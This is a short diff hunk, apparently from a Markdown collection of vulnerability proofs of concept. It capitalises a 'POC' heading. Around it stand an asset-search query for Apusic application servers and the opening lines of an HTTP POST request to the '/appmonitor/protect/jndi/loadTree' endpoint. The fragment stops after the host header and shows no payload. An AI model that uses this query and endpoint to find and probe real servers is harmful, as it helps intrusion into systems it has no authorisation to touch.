@@ -5,7 +5,7 @@
 app="Apusic应用服务器"
 ```
 
-## poc
+## POC
 ```
 POST /appmonitor/protect/jndi/loadTree HTTP/1.1
 host:127.0.0.1
